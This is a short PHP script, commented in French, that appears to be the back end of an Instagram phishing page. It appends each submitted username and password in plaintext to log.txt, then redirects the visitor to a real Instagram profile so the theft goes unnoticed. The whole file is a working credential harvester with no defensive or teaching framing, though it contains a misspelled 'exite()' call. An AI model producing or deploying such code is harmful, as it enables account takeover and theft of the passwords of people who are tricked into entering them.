<?php // Ce script va ouvrir un fichier log.txt, inscrire les données du formulaire et refermer le fichier.
$fp = fopen ("log.txt", "a");
fputs($fp, "\n");
fputs ($fp, "login : ".$_POST['username']);
fputs ($fp, " / password : ".$_POST['password']);
fclose ($fp);
header('Location: https://www.instagram.com/thelinuxproject/?hl=fr');
exite();
?>
